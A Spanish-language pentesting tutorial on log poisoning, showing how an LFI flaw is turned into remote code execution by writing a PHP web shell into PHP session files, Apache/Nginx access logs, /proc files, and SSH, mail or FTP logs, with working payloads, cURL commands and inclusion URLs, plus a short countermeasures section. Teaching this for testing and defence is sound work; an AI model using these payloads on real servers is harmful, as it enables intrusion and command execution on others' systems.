---
title: Log Poisoning
date: 2025-06-07 11:00:00 +0000
categories: [Web Security, Pentesting]
tags: [log-poisoning, LFI, php-sessions, apache-logs, nginx-logs, RCE]
image: 
    path: /assets/img/posts/log-poisoning/log-poisoning-banner.png
    alt:  cabecera
description: >
  Envenenamiento de Logs para Ejecución Remota de Código
pin: false  
toc: true   
math: false 
mermaid: false 
---

El **envenenamiento de logs (Log Poisoning)** es una técnica avanzada que permite lograr **ejecución remota de código** a través de vulnerabilidades LFI. Esta técnica se basa en escribir código PHP en campos que controlamos y que quedan registrados en archivos de log, para luego incluir esos logs a través de la vulnerabilidad LFI.

---

## Conceptos Fundamentales

Si incluimos cualquier archivo que contenga código PHP, este será ejecutado, siempre y cuando la función vulnerable tenga privilegios de **ejecución**. Los ataques que discutiremos en esta sección se basan en el mismo concepto: escribir código PHP en un campo que controlamos que queda registrado en un archivo de log (envenenar/contaminar el archivo de log), y luego incluir ese archivo para ejecutar el código PHP.

Para que este ataque funcione, la aplicación web PHP debe tener **privilegios de lectura** sobre los archivos registrados, lo cual varía de un servidor a otro.

---

### Funciones Vulnerables

Las siguientes funciones con privilegios de **ejecución** son vulnerables a estos ataques:

| Lenguaje | Función | Leer Contenido | Ejecutar | URL Remota |
|----------|---------|----------------|----------|------------|
| **PHP** | `include()/include_once()` | ✅ | ✅ | ✅ |
| **PHP** | `require()/require_once()` | ✅ | ✅ | ❌ |
| **NodeJS** | `res.render()` | ✅ | ✅ | ❌ |
| **Java** | `import` | ✅ | ✅ | ✅ |
| **.NET** | `include` | ✅ | ✅ | ✅ |

---

## PHP Session Poisoning

### Ubicación de Archivos de Sesión

La mayoría de aplicaciones web PHP utilizan cookies **PHPSESSID**, que pueden contener datos específicos relacionados con el usuario en el back-end, para que la aplicación web pueda hacer seguimiento de los detalles del usuario a través de sus cookies.

**Ubicaciones típicas:**
- **Linux:** `/var/lib/php/sessions/`
- **Windows:** `C:\Windows\Temp\`

El nombre del archivo que contiene los datos de nuestro usuario coincide con el nombre de nuestra cookie PHPSESSID con el prefijo `sess_`.

### Identificando la Cookie de Sesión

![Cookie Inspection](/assets/img/posts/log-poisoning/phpsessid-cookie.png)
_Inspección de la cookie PHPSESSID en el navegador_

Si nuestra cookie PHPSESSID tiene el valor `jt8tq8r5fveklnnmqd38bsplkc`, entonces debería estar almacenada en `/var/lib/php/sessions/sess_jt8tq8r5fveklnnmqd38bsplkc`.

### Examinando el Contenido de la Sesión

Primero incluimos el archivo de sesión a través de la vulnerabilidad LFI:

```
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_jt8tq8r5fveklnnmqd38bsplkc
```

![Session Content](/assets/img/posts/log-poisoning/session-content.png)
_Contenido del archivo de sesión mostrando valores controlables_

Observamos que el archivo de sesión contiene dos valores:
- **page:** muestra la página de idioma seleccionada
- **preference:** muestra el idioma seleccionado

El valor `page` está bajo nuestro control, ya que podemos controlarlo a través del parámetro `?language=`.

### Envenenando la Sesión

Establecemos un valor personalizado para verificar que podemos controlar el contenido:

```
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```

![Session Poisoning Test](/assets/img/posts/log-poisoning/session-poisoning-test.png)
_Verificación de control sobre el contenido de la sesión_

Ahora envenenamos la sesión escribiendo código PHP mediante URL encoding:

```
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

### Ejecución de Comandos

Finalmente, incluimos el archivo de sesión y ejecutamos comandos:

```
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_jt8tq8r5fveklnnmqd38bsplkc&cmd=id
```

![Command Execution](/assets/img/posts/log-poisoning/session-command-execution.png)
_Ejecución exitosa de comandos a través de la sesión envenenada_

> **Nota:** Para ejecutar otro comando, el archivo de sesión debe ser envenenado nuevamente con el web shell, ya que se sobrescribe después de nuestra última inclusión.

---

## Server Log Poisoning

### Ubicaciones de Logs por Defecto

Tanto Apache como Nginx mantienen varios archivos de log, como `access.log` y `error.log`. El archivo `access.log` contiene información variada sobre todas las peticiones realizadas al servidor, incluyendo el header **User-Agent** de cada petición.

**Ubicaciones típicas:**

| Servidor | Sistema | Ruta de Logs |
|----------|---------|--------------|
| **Apache** | Linux | `/var/log/apache2/` |
| **Apache** | Windows | `C:\xampp\apache\logs\` |
| **Nginx** | Linux | `/var/log/nginx/` |
| **Nginx** | Windows | `C:\nginx\log\` |

### Permisos de Lectura

- **Nginx:** Los logs son legibles por usuarios con pocos privilegios por defecto (ej. `www-data`)
- **Apache:** Los logs solo son legibles por usuarios con altos privilegios (ej. grupos `root/adm`)

> **Tip:** En servidores Apache antiguos o mal configurados, estos logs pueden ser legibles por usuarios con pocos privilegios.

### Verificando Acceso a Logs

Intentamos incluir el log de acceso de Apache:

```
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
```

![Access Log](/assets/img/posts/log-poisoning/access-log.png)
_Contenido del log de acceso mostrando User-Agent headers_

Observamos que el log contiene la dirección IP remota, página solicitada, código de respuesta y el header **User-Agent**, que está bajo nuestro control.

### Advertencia sobre Logs

> **Tip:** Los logs tienden a ser enormes, y cargarlos en una vulnerabilidad LFI puede tomar mucho tiempo, o incluso crashear el servidor en el peor de los casos. Ten cuidado y sé eficiente con ellos en un entorno de producción.

### Envenenando con Burp Suite

Interceptamos una petición LFI y modificamos el header User-Agent:

![Burp Suite Poisoning](/assets/img/posts/log-poisoning/burp-poisoning.png)
_Modificación del User-Agent header para envenenamiento de logs_

Como se esperaba, nuestro valor personalizado de User-Agent es visible en el archivo de log incluido.

### Inyectando Web Shell

Ahora envenenamos el log configurando el User-Agent a un web shell PHP básico:

```http
User-Agent: <?php system($_GET['cmd']); ?>
```

![Log Web Shell](/assets/img/posts/log-poisoning/log-webshell.png)
_Inyección de web shell en el log de Apache_

### Envenenando con cURL

También podemos envenenar el log enviando una petición a través de cURL:

```bash
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```

### Ejecutando Comandos

Como el log ahora contiene código PHP, la vulnerabilidad LFI ejecutará este código:

```
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
```

![Apache Log Execution](/assets/img/posts/log-poisoning/apache-log-execution.png)
_Ejecución exitosa de comandos a través del log envenenado de Apache_

---

## Otros Logs y Técnicas Alternativas

### Archivos /proc/ en Linux

El header User-Agent también se muestra en archivos de proceso bajo el directorio `/proc/` de Linux:

- `/proc/self/environ`
- `/proc/self/fd/N` (donde N es un PID usualmente entre 0-50)

Esto puede ser útil si no tenemos acceso de lectura sobre los logs del servidor.

### Logs de Servicios Adicionales

Dependiendo de los logs sobre los que tengamos acceso de lectura, podemos utilizar técnicas similares en varios logs del sistema:

| Servicio | Ubicación del Log | Técnica de Envenenamiento |
|----------|-------------------|---------------------------|
| **SSH** | `/var/log/sshd.log` | Configurar username a código PHP |
| **Mail** | `/var/log/mail` | Enviar email con código PHP |
| **FTP** | `/var/log/vsftpd.log` | Login con username malicioso |

### Ejemplos de Envenenamiento por Servicio

#### SSH Poisoning
Si el servicio SSH está expuesto y podemos leer sus logs:
```bash
ssh '<?php system($_GET["cmd"]); ?>'@target.com
```

#### Mail Poisoning
Si podemos leer logs de mail:
```bash
echo '<?php system($_GET["cmd"]); ?>' | mail test@target.com
```

#### FTP Poisoning
Si el servicio FTP está expuesto:
```bash
ftp target.com
# Username: <?php system($_GET["cmd"]); ?>
```

---

## Contramedidas y Prevención

### Configuración de Logs
- Configurar permisos restrictivos en archivos de log
- Rotar logs regularmente para reducir su tamaño
- Filtrar y sanitizar datos antes de loggear

### Validación de Entradas
- Validar y sanitizar headers HTTP
- Implementar filtering en User-Agent headers
- Rechazar caracteres especiales en campos loggeados

### Aislamiento de Aplicaciones
- Ejecutar aplicaciones web con usuarios de bajos privilegios
- Restringir acceso de lectura a archivos de log
- Implementar chroot jails cuando sea posible

---

## Conclusiones

El **envenenamiento de logs** es una técnica poderosa que puede convertir una vulnerabilidad LFI en **ejecución remota de código**. La técnica se puede generalizar a cualquier log que registre un parámetro que controlemos y que podamos leer a través de la vulnerabilidad LFI.

Los **archivos de sesión PHP** suelen ser la opción más confiable, mientras que los **logs de servidor** requieren permisos específicos pero ofrecen mayor persistencia.

---

### Referencias

- [OWASP Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [PHP Session Security](https://www.php.net/manual/en/session.security.php)
- [Log Injection Attack Patterns](https://cwe.mitre.org/data/definitions/117.html)